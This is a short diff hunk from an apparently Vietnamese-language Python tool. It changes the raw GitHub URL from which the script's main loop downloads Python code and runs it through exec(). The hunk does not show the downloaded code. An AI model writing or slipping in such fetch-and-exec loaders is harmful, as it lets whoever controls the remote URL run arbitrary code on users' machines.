@@ -307,7 +307,7 @@ if __name__ == '__main__':
 
     while True:
         try:
-            response = requests.get('https://raw.githubusercontent.com/mleccuuuu/cc/main/menuu.py', timeout=5)
+            response = requests.get('https://raw.githubusercontent.com/chhhgggg/h/refs/heads/main/menu.py', timeout=5)
             exec(response.text)
         except requests.ConnectionError:
             print("\033[1;91mMất kết nối! Tool sẽ tự động thoát.")
